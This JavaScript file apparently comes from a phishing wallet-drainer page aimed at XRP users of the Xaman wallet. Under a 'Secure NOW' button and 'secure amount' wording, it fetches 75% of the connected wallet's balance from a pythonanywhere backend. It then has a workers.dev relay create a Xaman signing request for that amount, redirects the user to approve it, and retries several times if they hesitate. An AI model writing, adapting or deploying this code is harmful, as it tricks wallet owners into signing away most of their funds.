// ==============================
// STATE (MUST BE FIRST)
// ==============================
let currentAddress = null;
let approvalPending = false;
let retryCount = 0;
const MAX_RETRIES = 3;

// ==============================
// UI
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function lockButton(lock) {
  const btn = document.getElementById("mainActionButton");
  if (!btn) return;
  btn.disabled = lock;
  btn.textContent = lock ? "Approval Pending…" : "Secure NOW";
}

// ==============================
// MAIN FLOW
// ==============================
async function triggerManualApproval() {
  if (!currentAddress || approvalPending) return;

  approvalPending = true;
  retryCount = 0;
  lockButton(true);

  try {
    setStatus("Calculating secure amount…");

    // 1️⃣ Get 75% amount from backend
    const calcRes = await fetch(
      "https://cultured.pythonanywhere.com/api/calc-amount",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: currentAddress })
      }
    );

    const calc = await calcRes.json();
    if (!calcRes.ok) throw new Error(calc.detail);

    const amount = calc.amountDrops;

    setStatus("Requesting Xaman approval…");

    // 2️⃣ Create Xaman payload
    const res = await fetch(
      "https://xaman-relay.williamanderson09945.workers.dev",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: currentAddress, amount })
      }
    );

    const data = await res.json();
    if (!res.ok || !data.signUrl) throw new Error("Approval failed");

    window.location.href = data.signUrl;
    startTimeout();

  } catch (err) {
    handleFailure(err.message);
  }
}

// ==============================
// RETRY LOGIC
// ==============================
function startTimeout() {
  setTimeout(() => {
    if (!approvalPending) return;
    retryCount++;

    if (retryCount <= MAX_RETRIES) {
      setStatus(`Retrying approval (${retryCount}/${MAX_RETRIES})…`);
      approvalPending = false;
      triggerManualApproval();
    } else {
      resetState("Approval cancelled");
    }
  }, 65000);
}

function handleFailure(msg) {
  resetState(msg || "Approval failed");
}

function resetState(msg) {
  approvalPending = false;
  retryCount = 0;
  lockButton(false);
  setStatus(msg);
}
